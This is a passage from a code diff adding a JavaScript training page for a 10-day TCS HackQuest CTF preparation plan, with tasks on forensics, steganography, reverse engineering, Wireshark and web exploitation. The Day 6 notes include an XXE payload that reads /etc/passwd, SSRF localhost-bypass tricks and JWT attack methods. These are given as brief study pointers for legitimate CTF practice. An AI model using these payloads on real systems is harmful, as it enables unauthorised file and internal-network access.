+                        difficulty: "intermediate",
+                        resources: [
+                            { name: "Previous Years' Solutions", url: "PDFs/TCS-HackQuest-Previous-Years-Solutions.pdf", type: "pdf", pages: "Pages 7-8, 21-25" },
+                            { name: "50 Practice Problems", url: "PDFs/TCS-HackQuest-50-Practice-Problems.pdf", type: "pdf", pages: "Crypto section" }
+                        ],
+                        pyqChallenges: [
+                            { name: "DigiMagic (Base64)", points: 100, category: "Crypto", season: 5 },
+                            { name: "Cloak and Dagger (Certificate)", points: 100, category: "Crypto", season: 7 },
+                            { name: "Code de Tour (RC4)", points: 100, category: "Crypto", season: 8 },
+                            { name: "Optimus Prime (RSA)", points: 100, category: "Crypto", season: 8 },
+                            { name: "Kohraa (Octal)", points: 100, category: "Crypto", season: 8 }
+                        ]
+                    }
+                ]
+            },
+            day4: {
+                title: "Day 4: Digital Forensics & Steganography",
+                timeAllocation: "10-12 hours",
+                objectives: ["Master file analysis techniques", "Learn steganography tools", "Practice image forensics"],
+                tasks: [
+                    {
+                        id: "d4t1",
+                        title: "Study: File Analysis & Metadata",
+                        description: "Learn to extract and analyze file metadata using various tools.",
+                        time: "1.5 hours",
+                        difficulty: "beginner",
+                        resources: [
+                            { name: "Previous Years' Solutions", url: "PDFs/TCS-HackQuest-Previous-Years-Solutions.pdf", type: "pdf", pages: "Pages 5-6, 11-12 (Miss Magic, I am Always)" },
+                            { name: "Complete Preparation Guide", url: "PDFs/TCS-HackQuest-Complete-Preparation-Guide.pdf", type: "pdf", pages: "Pages 26-30 (Forensics)" }
+                        ],
+                        concepts: [
+                            { title: "File Signatures (Magic Bytes)", content: "First bytes identify file type. PNG: <code>89 50 4E 47</code>, JPEG: <code>FF D8 FF</code>, ZIP: <code>50 4B</code>. Use <code>file</code> command." },
+                            { title: "EXIF Metadata", content: "Images contain GPS, camera settings, timestamps, comments. Tool: <code>exiftool image.jpg</code>" },
+                            { title: "Strings Extraction", content: "Extract ASCII strings: <code>strings file.bin | grep flag</code>. Often reveals hidden data." },
+                            { title: "Hex Editors", content: "View raw bytes. HxD (GUI), hexdump/xxd (CLI). Essential for file repair and analysis." }
+                        ]
+                    },
+                    {
+                        id: "d4t2",
+                        title: "Practice: File Repair & Analysis",
+                        description: "Fix corrupted files by editing magic bytes and headers.",
+                        time: "2 hours",
+                        difficulty: "beginner",
+                        steps: [
+                            "Install hex editor: <code>brew install hexedit</code>",
+                            "Practice with corrupted files from Mock Challenges",
+                            "Learn common file signatures from Wikipedia",
+                            "Recreate 'Miss Magic' challenge (corrupt PNG repair)",
+                            "Practice with different file types: PDF, ZIP, GIF"
+                        ]
+                    },
+                    {
+                        id: "d4t3",
+                        title: "Study: Steganography Techniques",
+                        description: "Understand methods of hiding data in images, audio, and other files.",
+                        time: "2 hours",
+                        difficulty: "intermediate",
+                        resources: [
+                            { name: "Mock Challenges Walkthrough", url: "PDFs/TCS-HackQuest-Mock-Challenges-Walkthrough.pdf", type: "pdf", pages: "Pages 4-5 (Challenge 2)" },
+                            { name: "Previous Years' Solutions", url: "PDFs/TCS-HackQuest-Previous-Years-Solutions.pdf", type: "pdf", pages: "Pages 5-6, 26-27 (Office Leaks)" }
+                        ],
+                        concepts: [
+                            { title: "LSB Steganography", content: "Least Significant Bit manipulation in images. Data hidden in last bit of each pixel. Tool: <code>zsteg</code>" },
+                            { title: "File Concatenation", content: "Files appended to images. Use <code>binwalk</code> to detect: <code>binwalk -e image.jpg</code>" },
+                            { title: "Steghide Tool", content: "Password-protected embedding: <code>steghide extract -sf image.jpg</code>. Try empty password first." },
+                            { title: "Image Dimension Tricks", content: "Hidden data in extended image height/width. Modify JPEG SOF0 marker to reveal." }
+                        ]
+                    },
+                    {
+                        id: "d4t4",
+                        title: "Practice: Steganography Lab",
+                        description: "Use all major steganography tools on practice images.",
+                        time: "3 hours",
+                        difficulty: "intermediate",
+                        steps: [
+                            "Install tools: <code>brew install steghide binwalk exiftool foremost</code>",
+                            "Tool 1 - ExifTool: Extract all metadata",
+                            "Tool 2 - Binwalk: Find hidden files: <code>binwalk -e image.jpg</code>",
+                            "Tool 3 - Steghide: Try extraction with common passwords",
+                            "Tool 4 - Strings: Search for text: <code>strings image.jpg | grep -i flag</code>",
+                            "Tool 5 - Zsteg: LSB analysis (PNG): <code>zsteg -a image.png</code>"
+                        ],
+                        labs: [
+                            { name: "Steganography Online", difficulty: "beginner", challenges: "5", url: "https://stegonline.georgeom.net/upload" },
+                            { name: "TryHackMe - Intro to Digital Forensics", difficulty: "beginner", challenges: "6", url: "https://tryhackme.com/room/introdigitalforensics" },
+                            { name: "HackTheBox - Forensics Challenges", difficulty: "intermediate", challenges: "5-10", url: "https://app.hackthebox.com/challenges/forensics" },
+                            { name: "PicoCTF - Forensics Category", difficulty: "mixed", challenges: "15+", url: "https://play.picoctf.org/practice?category=4" }
+                        ]
+                    },
+                    {
+                        id: "d4t5",
+                        title: "Solve: TCS PYQ Forensics Challenges",
+                        description: "Complete all forensics and steganography challenges from past seasons.",
+                        time: "3.5 hours",
+                        difficulty: "intermediate",
+                        resources: [
+                            { name: "Previous Years' Solutions", url: "PDFs/TCS-HackQuest-Previous-Years-Solutions.pdf", type: "pdf", pages: "Pages 5-6, 11-12, 26-29" },
+                            { name: "File Navigation Guide", url: "PDFs/File-Navigation-Guide.pdf", type: "pdf", pages: "Day 4 workflow" }
+                        ],
+                        pyqChallenges: [
+                            { name: "I am Always... (EXIF)", points: 100, category: "Forensics", season: 5 },
+                            { name: "Miss Magic (Magic Bytes)", points: 100, category: "Forensics", season: 7 },
+                            { name: "Office Leaks (JPEG Height)", points: 200, category: "Forensics", season: 8 },
+                            { name: "Kohraa (QR Repair)", points: 100, category: "Forensics", season: 8 }
+                        ]
+                    }
+                ]
+            },
+            day5: {
+                title: "Day 5: Reverse Engineering Basics",
+                timeAllocation: "9-11 hours",
+                objectives: ["Learn binary analysis tools", "Understand assembly basics", "Practice with Ghidra"],
+                tasks: [
+                    {
+                        id: "d5t1",
+                        title: "Study: Binary Analysis Fundamentals",
+                        description: "Learn how to analyze compiled executables and understand their behavior.",
+                        time: "2 hours",
+                        difficulty: "intermediate",
+                        resources: [
+                            { name: "Previous Years' Solutions", url: "PDFs/TCS-HackQuest-Previous-Years-Solutions.pdf", type: "pdf", pages: "Pages 21-23 (Demolition Derby)" },
+                            { name: "Complete Preparation Guide", url: "PDFs/TCS-HackQuest-Complete-Preparation-Guide.pdf", type: "pdf", pages: "Pages 31-35 (Reverse Engineering)" },
+                            { name: "Ghidra Cheat Sheet", url: "https://ghidra-sre.org/CheatSheet.html", type: "external" }
+                        ],
+                        concepts: [
+                            { title: "File Analysis", content: "Commands: <code>file binary</code> (identify type), <code>strings binary</code> (extract text), <code>checksec binary</code> (security features)" },
+                            { title: "Static vs Dynamic Analysis", content: "Static: code reading without execution (Ghidra, IDA). Dynamic: runtime analysis (GDB, ltrace, strace)" },
+                            { title: "Assembly Basics", content: "Common instructions: MOV (move data), CMP (compare), JMP (jump), CALL (function), RET (return)" },
+                            { title: "Decompilation", content: "Convert assembly to pseudo-C code. Ghidra's decompiler is excellent and free." }
+                        ]
+                    },
+                    {
+                        id: "d5t2",
+                        title: "Setup: Install Reverse Engineering Tools",
+                        description: "Install and configure Ghidra, radare2, and other RE tools.",
+                        time: "1 hour",
+                        difficulty: "beginner",
+                        steps: [
+                            "Download Ghidra from NSA website: https://ghidra-sre.org/",
+                            "Requires Java: <code>brew install openjdk</code>",
+                            "Install radare2: <code>brew install radare2</code>",
+                            "Install GDB: <code>brew install gdb</code>",
+                            "Install Binary Ninja (optional, trial version)",
+                            "Test with simple binary: <code>ghidra</code>"
+                        ]
+                    },
+                    {
+                        id: "d5t3",
+                        title: "Tutorial: Ghidra Walkthrough",
+                        description: "Learn Ghidra interface and basic analysis workflow.",
+                        time: "2 hours",
+                        difficulty: "intermediate",
+                        steps: [
+                            "Create new project in Ghidra",
+                            "Import binary (File → Import File)",
+                            "Run auto-analysis (Analysis → Auto Analyze)",
+                            "Navigate: Symbol Tree → Functions → main",
+                            "View decompiler output (Window → Decompile)",
+                            "Search for strings (Search → For Strings)",
+                            "Practice with simple crackme from PicoCTF"
+                        ],
+                        labs: [
+                            { name: "YouTube: Ghidra Basics Tutorial", difficulty: "beginner", challenges: "Follow along", url: "https://www.youtube.com/results?search_query=ghidra+tutorial+beginners" },
+                            { name: "TryHackMe - Reverse Engineering", difficulty: "beginner", challenges: "8", url: "https://tryhackme.com/room/reverseengineering" },
+                            { name: "MicroCorruption (Embedded RE)", difficulty: "intermediate", challenges: "19 levels", url: "https://microcorruption.com/" }
+                        ]
+                    },
+                    {
+                        id: "d5t4",
+                        title: "Practice: PicoCTF Reverse Engineering",
+                        description: "Complete 5-7 beginner reverse engineering challenges.",
+                        time: "3 hours",
+                        difficulty: "intermediate",
+                        labs: [
+                            { name: "PicoCTF - Reverse Engineering", difficulty: "beginner", challenges: "5-7", url: "https://play.picoctf.org/practice?category=3&page=1" },
+                            { name: "HackTheBox - Reversing Challenges", difficulty: "intermediate", challenges: "5-8", url: "https://app.hackthebox.com/challenges/reversing" },
+                            { name: "Crackmes.one", difficulty: "mixed", challenges: "100+", url: "https://crackmes.one/" }
+                        ],
+                        steps: [
+                            "Start with 'vault-door' series (easy password checks)",
+                            "Progress to challenges requiring Ghidra",
+                            "Document your analysis process",
+                            "Learn to read x86-64 assembly gradually"
+                        ]
+                    },
+                    {
+                        id: "d5t5",
+                        title: "Solve: TCS PYQ Reverse Engineering",
+                        description: "Complete Demolition Derby (Go binary) from Season 8.",
+                        time: "2 hours",
+                        difficulty: "intermediate",
+                        resources: [
+                            { name: "Previous Years' Solutions", url: "PDFs/TCS-HackQuest-Previous-Years-Solutions.pdf", type: "pdf", pages: "Pages 21-23" },
+                            { name: "Report Template", url: "Templates/tcs_hackquest_report_template.md", type: "markdown", pages: "Practice reporting" }
+                        ],
+                        pyqChallenges: [
+                            { name: "Demolition Derby (Go Binary)", points: 200, category: "Reverse", season: 8 }
+                        ],
+                        steps: [
+                            "Attempt WITHOUT solution first (1 hour)",
+                            "Open in Ghidra, analyze main.checkPasswordStrength",
+                            "Look for character arrays in hex view",
+                            "Compare with provided solution approach",
+                            "Write comprehensive report"
+                        ]
+                    }
+                ]
+            },
+            day6: {
+                title: "Day 6: Network Security & Advanced Web",
+                timeAllocation: "10-12 hours",
+                objectives: ["Master network traffic analysis", "Learn advanced web exploits", "Practice with Wireshark"],
+                tasks: [
+                    {
+                        id: "d6t1",
+                        title: "Study: Network Protocol Analysis",
+                        description: "Learn to analyze PCAP files and understand network protocols.",
+                        time: "2 hours",
+                        difficulty: "intermediate",
+                        concepts: [
+                            { title: "Wireshark Basics", content: "Filter syntax: <code>http</code>, <code>tcp.port == 80</code>, <code>ip.addr == 192.168.1.1</code>. Follow streams: right-click → Follow → TCP/HTTP" },
+                            { title: "Common Protocols", content: "HTTP (port 80), HTTPS (443), FTP (21), SSH (22), DNS (53), SMTP (25). Understand request/response patterns." },
+                            { title: "HTTP Analysis", content: "Export objects: File → Export Objects → HTTP. Reconstruct file transfers and form submissions." },
+                            { title: "Packet Inspection", content: "Examine headers, payloads, flags. Look for credentials, cookies, API keys in cleartext protocols." }
+                        ]
+                    },
+                    {
+                        id: "d6t2",
+                        title: "Practice: Wireshark Labs",
+                        description: "Analyze sample PCAP files to extract flags and sensitive information.",
+                        time: "3 hours",
+                        difficulty: "intermediate",
+                        labs: [
+                            { name: "Wireshark Practice - Malware Traffic", difficulty: "intermediate", challenges: "3-4", url: "https://www.malware-traffic-analysis.net/" },
+                            { name: "PicoCTF - Forensics (Network)", difficulty: "beginner", challenges: "2-3", url: "https://play.picoctf.org/practice?category=4&page=1" },
+                            { name: "TryHackMe - Wireshark 101", difficulty: "beginner", challenges: "7", url: "https://tryhackme.com/room/wireshark" },
+                            { name: "HackTheBox - Packet Analysis", difficulty: "intermediate", challenges: "4-6", url: "https://app.hackthebox.com/tracks/Packet-Analysis" }
+                        ]
+                    },
+                    {
+                        id: "d6t3",
+                        title: "Study: Advanced Web Exploitation",
+                        description: "Learn SSRF, XXE, JWT manipulation, and other advanced techniques.",
+                        time: "2 hours",
+                        difficulty: "advanced",
+                        resources: [
+                            { name: "Mock Challenges Walkthrough", url: "PDFs/TCS-HackQuest-Mock-Challenges-Walkthrough.pdf", type: "pdf", pages: "Pages 10-16 (Challenges 4, 7, 8)" },
+                            { name: "Previous Years' Solutions", url: "PDFs/TCS-HackQuest-Previous-Years-Solutions.pdf", type: "pdf", pages: "Pages 8-10, 24-26 (Request Tracer)" },
+                            { name: "Complete Preparation Guide", url: "PDFs/TCS-HackQuest-Complete-Preparation-Guide.pdf", type: "pdf", pages: "Pages 36-40 (Advanced)" }
+                        ],
+                        concepts: [
+                            { title: "SSRF (Server-Side Request Forgery)", content: "Force server to make requests to internal resources. Bypass: localhost, 127.0.0.1, [::1], decimal IP, hex IP" },
+                            { title: "XXE (XML External Entity)", content: "Inject external entities in XML: <code>&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;</code>. Read local files." },
+                            { title: "JWT Attacks", content: "None algorithm attack, weak secret brute force, algorithm confusion (RS256 → HS256)" },
+                            { title: "API Security", content: "Parameter manipulation, HTTP method tampering (PUT, PATCH, DELETE), header injection (X-Forwarded-For)" }
+                        ]
+                    },
+                    {
+                        id: "d6t4",
+                        title: "Practice: PortSwigger Advanced Labs",
+                        description: "Complete advanced web security labs covering SSRF, XXE, JWT.",
+                        time: "4 hours",
+                        difficulty: "advanced",
+                        labs: [
+                            { name: "PortSwigger - SSRF", difficulty: "intermediate", challenges: "3-4", url: "https://portswigger.net/web-security/ssrf" },
+                            { name: "PortSwigger - XXE", difficulty: "intermediate", challenges: "3-4", url: "https://portswigger.net/web-security/xxe" },
+                            { name: "PortSwigger - JWT", difficulty: "advanced", challenges: "2-3", url: "https://portswigger.net/web-security/jwt" },
+                            { name: "TryHackMe - SSRF Room", difficulty: "intermediate", challenges: "5", url: "https://tryhackme.com/room/ssrfqi" },
+                            { name: "HackTheBox - Web Exploitation", difficulty: "advanced", challenges: "8-12", url: "https://app.hackthebox.com/challenges/web" }
+                        ]
+                    },
+                    {
+                        id: "d6t5",
+                        title: "Solve: TCS PYQ Network & Advanced Web",
+                        description: "Complete network forensics and advanced web challenges from past seasons.",
+                        time: "2 hours",
+                        difficulty: "advanced",
+                        resources: [
+                            { name: "Previous Years' Solutions", url: "PDFs/TCS-HackQuest-Previous-Years-Solutions.pdf", type: "pdf", pages: "Pages 30-31, 24-26" }
+                        ],
+                        pyqChallenges: [
+                            { name: "Lost Batman (PCAP)", points: 200, category: "Network", season: 7 },
+                            { name: "Request Tracer (JWT+HTTP)", points: 100, category: "Web", season: 8 }
+                        ]
+                    }
+                ]
+            },
+            day7: {
+                title: "Day 7: Comprehensive Challenge Day",
+                timeAllocation: "12-14 hours",
+                objectives: ["Solve 15-20 mixed challenges", "Practice time management", "Perfect report writing"],
+                tasks: [
+                    {
+                        id: "d7t1",
+                        title: "Morning Sprint: Web Challenges",
+                        description: "Complete 5-6 web exploitation challenges under time pressure.",
+                        time: "3 hours",
+                        difficulty: "mixed",
+                        labs: [
+                            { name: "HackTheBox - Easy Web", difficulty: "beginner", challenges: "2-3", url: "https://app.hackthebox.com/challenges/web" },
+                            { name: "Root-Me - Web Server", difficulty: "intermediate", challenges: "3-4", url: "https://www.root-me.org/en/Challenges/Web-Server/" },
+                            { name: "TryHackMe - Web Fundamentals", difficulty: "mixed", challenges: "10+", url: "https://tryhackme.com/paths" },
+                            { name: "Web Security Academy - All Labs", difficulty: "mixed", challenges: "20+", url: "https://portswigger.net/web-security/all-labs" }
+                        ]
+                    },
+                    {
+                        id: "d7t2",
+                        title: "Midday Sprint: Crypto + Forensics",
+                        description: "Solve 5-6 challenges from cryptography and forensics categories.",
+                        time: "3 hours",
+                        difficulty: "mixed",
+                        labs: [
+                            { name: "CryptoHack - Mixed", difficulty: "intermediate", challenges: "3-4", url: "https://cryptohack.org/challenges/" },
+                            { name: "HackTheBox - Forensics", difficulty: "beginner", challenges: "2-3", url: "https://app.hackthebox.com/challenges/forensics" },
+                            { name: "TryHackMe - Forensics Path", difficulty: "mixed", challenges: "15+", url: "https://tryhackme.com/paths" }
+                        ]
+                    },
+                    {
+                        id: "d7t3",
+                        title: "Afternoon Session: All PYQ Challenges",
+                        description: "Solve ALL remaining TCS HackQuest previous year questions.",
+                        time: "5 hours",
+                        difficulty: "mixed",
+                        resources: [
+                            { name: "Previous Years' Solutions", url: "PDFs/TCS-HackQuest-Previous-Years-Solutions.pdf", type: "pdf", pages: "Complete document review" },
+                            { name: "File Navigation Guide", url: "PDFs/File-Navigation-Guide.pdf", type: "pdf", pages: "Day 7 workflow" }
+                        ],
+                        pyqChallenges: [
+                            { name: "Deceptive Mayhem (Tor)", points: 200, category: "Web", season: 5 },
+                            { name: "Calling Charlie (Morse)", points: 100, category: "Forensics", season: 7 },
+                            { name: "Leaks Leaks (Git)", points: 200, category: "OSINT", season: 7 },
+                            { name: "Excess Talent (XSS)", points: 300, category: "Web", season: 7 },
+                            { name: "Metaverse (Multi-stage)", points: 1000, category: "Mixed", season: 8 }
+                        ]
+                    },
+                    {
+                        id: "d7t4",
+                        title: "Report Writing Practice",
+                        description: "Write comprehensive reports for 3 completed challenges.",
+                        time: "2 hours",
+                        difficulty: "critical",
+                        resources: [
+                            { name: "Report Template", url: "Templates/tcs_hackquest_report_template.md", type: "markdown" },
+                            { name: "Phase-by-Phase Guide", url: "PDFs/TCS-HackQuest-Phase-by-Phase-Guide.pdf", type: "pdf", pages: "Pages 8-12 (Report examples)" }
+                        ],
+                        steps: [
+                            "Choose 3 diverse challenges (Web, Crypto, Forensics)",
+                            "Write complete report with all sections",
+                            "Include screenshots with timestamps",
+                            "Document every command and payload",
+                            "Explain remediation recommendations",
+                            "Verify against checklist"
+                        ]
+                    }
+                ]
+            },
+            day8: {
+                title: "Day 8: Full Mock CTF Competition",
+                timeAllocation: "12-14 hours (6-hour mock + analysis)",
+                objectives: ["Simulate competition conditions", "Test time management", "Practice under pressure"],
+                tasks: [
+                    {
+                        id: "d8t1",
+                        title: "Pre-Competition Setup",
+                        description: "Prepare workspace and verify all tools are functional.",
+                        time: "30 minutes",
+                        difficulty: "beginner",
+                        steps: [
+                            "Organize folder structure: ~/CTF_Mock/{beginner,intermediate,expert,reports,screenshots}",
+                            "Test all tools: nmap, burp, ghidra, wireshark",
+                            "Open report template in text editor",
+                            "Disable notifications and distractions",
+                            "Set up timer for 6 hours",
+                            "Have water and snacks ready"
+                        ]
+                    },
+                    {
+                        id: "d8t2",
+                        title: "Mock CTF Round (6 hours)",
+                        description: "Complete full simulated competition with 15-20 challenges.",
+                        time: "6 hours",
+                        difficulty: "mixed",
+                        resources: [
+                            { name: "Phase-by-Phase Guide", url: "PDFs/TCS-HackQuest-Phase-by-Phase-Guide.pdf", type: "pdf", pages: "Pages 5-17 (Round 1 strategy)" },
+                            { name: "File Navigation Guide", url: "PDFs/File-Navigation-Guide.pdf", type: "pdf", pages: "Day 8 workflow" }
+                        ],
+                        labs: [
+                            { name: "CTFtime - Recent CTFs", difficulty: "mixed", challenges: "15-20", url: "https://ctftime.org/ctfs" },
+                            { name: "PicoCTF - Practice Competition", difficulty: "mixed", challenges: "20+", url: "https://play.picoctf.org/practice" },
+                            { name: "HackTheBox - Challenges", difficulty: "mixed", challenges: "15+", url: "https://app.hackthebox.com/challenges" },
+                            { name: "TryHackMe - King of the Hill", difficulty: "advanced", challenges: "Live", url: "https://tryhackme.com/games/koth" }
+                        ],
+                        strategy: [
+                            "First 20 mins: Survey ALL challenges, categorize by difficulty",
+                            "Hours 1-3: Beginner challenges (aim for 6-8 flags)",
+                            "Hours 3-5: Intermediate challenges (aim for 3-5 flags)",
+                            "Last 30 mins: Report finalization and submission"
+                        ]
+                    },
+                    {
+                        id: "d8t3",
+                        title: "Post-Competition Analysis",
+                        description: "Review performance, identify gaps, plan improvements.",
+                        time: "2 hours",
+                        difficulty: "critical",
+                        steps: [
+                            "Count flags captured by category",
+                            "Review time spent per challenge",
+                            "Identify where you got stuck",
+                            "Note which tools/techniques you forgot",
+                            "Read writeups for challenges you couldn't solve",
+                            "Update personal cheat sheet with new techniques",
+                            "Write reflection: what worked, what needs improvement"
+                        ]
+                    },
+                    {
+                        id: "d8t4",
+                        title: "Report Writing & Documentation",
+                        description: "Complete professional reports for all solved challenges.",
+                        time: "3 hours",
+                        difficulty: "critical",
+                        steps: [
+                            "Write report for EVERY challenge solved",
+                            "Include all mandatory sections",
+                            "Add screenshots with timestamps",
+                            "Document complete methodology",
+                            "Proofread for clarity and completeness",
+                            "Save in organized folder structure"
+                        ]
+                    }
+                ]
+            },
+            day9: {
+                title: "Day 9: Weak Areas & Speed Drills",
+                timeAllocation: "8-10 hours",
+                objectives: ["Focus on identified weaknesses", "Improve speed", "Master difficult concepts"],
+                tasks: [
+                    {
+                        id: "d9t1",
+                        title: "Review Day 8 Performance",
+                        description: "Analyze mock CTF results and create improvement plan.",
+                        time: "1 hour",
+                        difficulty: "critical",
+                        steps: [
+                            "Review your Day 8 reflection notes",
+                            "Identify 3 weakest categories/skills",
+                            "Create targeted practice plan",
+                            "Gather resources for weak areas",
+                            "Set specific improvement goals"
+                        ]
+                    },
+                    {
+                        id: "d9t2",
+                        title: "Targeted Practice: Weak Area 1",
+                        description: "Deep dive into your weakest category with focused practice.",
+                        time: "3 hours",
+                        difficulty: "personalized",
+                        labs: [
+                            { name: "Category-Specific Platform", difficulty: "mixed", challenges: "8-10", url: "Choose based on weak area" }
+                        ],
+                        suggestions: [
+                            "If weak in Crypto: CryptoHack intensive session",
+                            "If weak in Web: PortSwigger labs marathon",
+                            "If weak in Forensics: More steganography practice",
+                            "If weak in RE: More Ghidra walkthroughs",
+                            "If weak in Network: Wireshark packet analysis"
+                        ]
+                    },
+                    {
+                        id: "d9t3",
+                        title: "Speed Drills: Pattern Recognition",
+                        description: "Practice identifying challenge types quickly from descriptions.",
+                        time: "2 hours",
+                        difficulty: "intermediate",
+                        steps: [
+                            "Review all PYQ challenge descriptions",
+                            "Time yourself: identify category in <30 seconds",
+                            "List 3 tools needed for each challenge",
+                            "Practice: see challenge → immediate tool opening",
+                            "Build muscle memory for common patterns"
+                        ]
+                    },
+                    {
+                        id: "d9t4",
+                        title: "Speed Drills: Tool Workflows",
+                        description: "Practice rapid execution of common tool workflows.",
+                        time: "2 hours",
+                        difficulty: "intermediate",
+                        drills: [
+                            { task: "SQL Injection: From discovery to flag in <15 mins", reps: 3 },
+                            { task: "Image steganography: Run all 5 tools in <10 mins", reps: 3 },
+                            { task: "Network PCAP: Extract all HTTP objects in <5 mins", reps: 3 },
+                            { task: "Binary analysis: Ghidra import to main function in <3 mins", reps: 3 }
+                        ]
+                    },
+                    {
+                        id: "d9t5",
+                        title: "Cheat Sheet Refinement",
+                        description: "Finalize your quick reference for competition day.",
+                        time: "1 hour",
+                        difficulty: "critical",
+                        resources: [
+                            { name: "Cheatsheet Template", url: "Templates/tcs_hackquest_cheatsheet.md", type: "markdown" },
+                            { name: "File Navigation Guide", url: "PDFs/File-Navigation-Guide.pdf", type: "pdf", pages: "Day 9 section" },
+                            { name: "10-Day Plan CSV", url: "Guides/tcs_hackquest_10day_plan.csv", type: "csv" }
+                        ],
+                        steps: [
+                            "Review provided cheatsheet",
+                            "Add personal notes from 8 days practice",
+                            "Organize by category for quick lookup",
+                            "Include commands you frequently forgot",
+                            "Print or save in accessible location",
+                            "Test: can you find any command in <10 seconds?"
+                        ]
+                    }
+                ]
+            },
+            day10: {
+                title: "Day 10: Review & Mental Preparation",
+                timeAllocation: "4-6 hours (Light day!)",
+                objectives: ["Light review only", "Mental preparation", "Rest and confidence building"],
+                tasks: [
+                    {
+                        id: "d10t1",
+                        title: "Morning: Light Review Session",
+                        description: "Quick review of key concepts without heavy practice.",
+                        time: "2 hours",
+                        difficulty: "beginner",
+                        steps: [
+                            "Skim through all PDF guides (don't deep read)",
+                            "Review your cheat sheet thoroughly",
+                            "Watch 2-3 short CTF walkthrough videos",
+                            "Browse PYQ challenges quickly (refresh memory)",
+                            "Don't attempt new challenges today!"
+                        ]
+                    },
+                    {
+                        id: "d10t2",
+                        title: "Tool Verification Checklist",
+                        description: "Verify all tools are functional for competition day.",
+                        time: "30 minutes",
+                        difficulty: "critical",
+                        steps: [
+                            "Test internet connection speed",
+                            "Verify all CLI tools work: nmap, burp, exiftool",
+                            "Check VM is running smoothly",
+                            "Test screenshot capability (Command+Shift+4)",
+                            "Verify PDF viewer and text editor",
+                            "Check webcam (for Round 2 if applicable)",
+                            "Ensure charger and backup power ready"
+                        ]
+                    },
+                    {
+                        id: "d10t3",
+                        title: "Workspace Organization",
+                        description: "Prepare physical and digital workspace for competition.",
+                        time: "30 minutes",
+                        difficulty: "beginner",
+                        steps: [
+                            "Clean desk - remove distractions",
+                            "Organize folders: ~/TCS_HackQuest_2025/{beginner,intermediate,expert,reports,screenshots}",
+                            "Open report template in advance",
+                            "Bookmark important URLs (TCS platform, reference sites)",
+                            "Set up second monitor if available",
+                            "Prepare water bottle and healthy snacks"
+                        ]
+                    },
+                    {
+                        id: "d10t4",
+                        title: "Mental Preparation & Visualization",
+                        description: "Prepare mentally for competition stress and visualization exercises.",
+                        time: "1 hour",
+                        difficulty: "critical",
+                        steps: [
+                            "Visualize successful competition execution",
+                            "Review time management strategy",
+                            "Practice deep breathing exercises",
+                            "Remind yourself: you've prepared thoroughly",
+                            "Accept: some challenges will be unsolvable - that's OK",
+                            "Focus: documentation quality > number of flags",
+                            "Confidence: you know the patterns, trust your training"
+                        ]
+                    },
+                    {
+                        id: "d10t5",
+                        title: "Pre-Competition Checklist",
+                        description: "Final verification of readiness for competition day.",
+                        time: "30 minutes",
+                        difficulty: "critical",
+                        checklist: [
+                            "✓ All tools tested and functional",
+                            "✓ Cheat sheet printed/accessible",
+                            "✓ Report template ready",
+                            "✓ Workspace organized and clean",
+                            "✓ Internet connection stable",
+                            "✓ Know TCS platform login credentials",
+                            "✓ Phone on silent for 6 hours",
+                            "✓ Informed family/roommates of schedule",
+                            "✓ Set alarm for early wake-up",
+                            "✓ Planned nutritious pre-competition meal",
+                            "✓ 7-8 hours sleep scheduled",
+                            "✓ Mindset: calm, confident, prepared"
+                        ]
+                    },
+                    {
+                        id: "d10t6",
+                        title: "Evening: Complete Rest",
+                        description: "No studying! Relax and prepare for tomorrow.",
+                        time: "Rest of day",
+                        difficulty: "critical",
+                        activities: [
+                            "Light exercise or walk",
+                            "Watch favorite show (not CTF related!)",
+                            "Early dinner - nutritious meal",
+                            "No screen time 1 hour before bed",
+                            "Read fiction book or meditate",
+                            "Sleep by 10 PM for 7-8 hours",
+                            "Wake up refreshed and confident!"
+                        ]
+                    }
+                ]
+            }
+        };
+
+        let progressData = JSON.parse(localStorage.getItem('tcsHackquestProgress')) || {
+            completedTasks: [],
+            completedDays: [],
+            hoursLogged: 0
+        };
+
+        function initializeApp() {
+            createDayTabs();
+            renderDayContent('day1');
+            updateProgress();
+            generateResourcesList();
+        }
+
+        function createDayTabs() {
+            const tabsContainer = document.getElementById('dayTabs');
+            Object.keys(trainingData).forEach((dayKey, index) => {
+                const day = trainingData[dayKey];
+                const tab = document.createElement('div');
+                tab.className = `day-tab ${progressData.completedDays.includes(dayKey) ? 'completed' : ''}`;
+                tab.textContent = `Day ${index + 1}`;
+                tab.onclick = () => selectDay(dayKey);
+                tabsContainer.appendChild(tab);
+            });
+        }
+
+        function selectDay(dayKey) {
+            document.querySelectorAll('.day-tab').forEach((tab, i) => {
+                tab.classList.toggle('active', Object.keys(trainingData)[i] === dayKey);
+            });
+            renderDayContent(dayKey);
+        }
+
+        function renderDayContent(dayKey) {
+            const day = trainingData[dayKey];
+            const container = document.getElementById('dayContentContainer');
+            
+            let html = `
+                <div class="section">
+                    <div class="section-header">
+                        <h2>${day.title}</h2>
+                        <span class="time-badge">⏱️ ${day.timeAllocation}</span>
+                    </div>
+                    <div style="background: rgba(33,128,141,0.1); padding: 15px; border-radius: 8px; margin-bottom: 20px;">
+                        <h3 style="font-size: 16px; margin-bottom: 10px; color: var(--primary);">🎯 Learning Objectives</h3>
+                        <ul style="margin: 0; padding-left: 20px;">
+                            ${day.objectives.map(obj => `<li style="margin: 5px 0;">${obj}</li>`).join('')}
+                        </ul>
+                    </div>
+                </div>
+            `;
+
+            day.tasks.forEach(task => {
+                const isCompleted = progressData.completedTasks.includes(task.id);
+                html += `
+                    <div class="section">
+                        <div class="task-item ${isCompleted ? 'completed' : ''}">
+                            <div class="task-header">
+                                <input type="checkbox" class="task-checkbox" 
+                                    ${isCompleted ? 'checked' : ''} 
+                                    onchange="toggleTask('${task.id}', this.checked)">
+                                <div class="task-content">
+                                    <div class="task-title">${task.title}</div>
+                                    <div class="task-description">${task.description}</div>
+                                    
+                                    ${task.concepts ? `
+                                        <div style="margin-top: 15px;">
+                                            <h4 style="font-size: 14px; color: var(--primary); margin-bottom: 10px;">💡 Key Concepts</h4>
+                                            ${task.concepts.map(concept => `
+                                                <div class="concept-card">
+                                                    <h4>${concept.title}</h4>
+                                                    <p>${concept.content}</p>
+                                                </div>
+                                            `).join('')}
+                                        </div>
+                                    ` : ''}
+
+                                    ${task.steps ? `
+                                        <div style="margin-top: 15px;">
+                                            <h4 style="font-size: 14px; color: var(--primary); margin-bottom: 10px;">📋 Steps</h4>
+                                            <ol style="padding-left: 20px; margin: 0;">
+                                                ${task.steps.map(step => `<li style="margin: 8px 0; font-size: 13px;">${step}</li>`).join('')}
+                                            </ol>
+                                        </div>
+                                    ` : ''}
+
+                                    ${task.labs ? `
